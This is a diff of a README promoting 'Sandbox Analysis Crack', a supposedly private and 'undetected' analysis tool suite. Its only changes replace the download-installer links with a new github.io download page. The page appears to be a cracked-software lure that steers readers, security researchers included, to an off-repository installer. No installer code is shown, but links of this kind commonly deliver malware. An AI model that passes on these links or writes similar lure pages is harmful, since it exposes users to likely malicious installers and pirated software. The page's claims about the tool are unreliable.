@@ -2,7 +2,7 @@
 
 Sandbox Analysis Crack is a powerful, private tool suite designed for advanced automated behavioral analysis of suspicious files and processes. This version offers a feature-rich environment for analyzing digital artifacts in a controlled, undetected sandbox setting, ideal for security researchers and analysts.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -39,4 +39,4 @@ A: Absolutely. The suite includes an automated analysis queue and command-line i
 
 Access the full installer package and documentation through our official distribution channel.
 
-[Get Sandbox Analysis Crack from the official source](https://yellowtaxisave.github.io/download-page/)
+[Get Sandbox Analysis Crack from the official source](https://capitals-707-bringing.github.io/download-page/)
